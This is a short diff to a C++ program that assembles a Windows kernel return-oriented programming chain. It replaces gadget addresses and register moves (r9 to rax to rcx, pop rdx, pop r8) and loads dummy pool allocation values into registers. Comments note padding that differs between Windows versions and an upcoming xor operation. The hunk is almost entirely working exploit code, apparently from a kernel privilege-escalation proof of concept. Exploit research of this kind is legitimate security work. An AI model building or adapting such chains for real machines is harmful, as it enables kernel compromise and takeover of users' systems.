@@ -166,10 +166,15 @@ int main()
     KernelStackManager.AddPadding(0x20 + 0x8);
     KernelStackManager.AddGadget(0x263f08, "add rax, rcx; ret;");
 
-    // rcx=rax, stored here so we can overwrite rax for xor operation
-    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x302e3e, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
+    // same as above r9->rax->rcx, this is being stored here so we can overwrite rax for xor operation
+    KernelStackManager.AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
+    // uncomment if your windows version has "add rsp, 0x28" in the above gadget
+    // KernelStackManager.AddPadding(0x28);
+    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
+    KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "rdx = dummy pool allocation");
+    KernelStackManager.AddGadget(0x47f82d, "pop r8; ret;");
+    KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "r8 = dummy pool allocation");
+    KernelStackManager.AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
     // r11=rcx
     KernelStackManager.AddGadget(0xb4096a, "mov r11, rcx; cmp edx, dword ptr [rax]; je 0xb42978; mov eax, 0xc000000d; ret;");
 
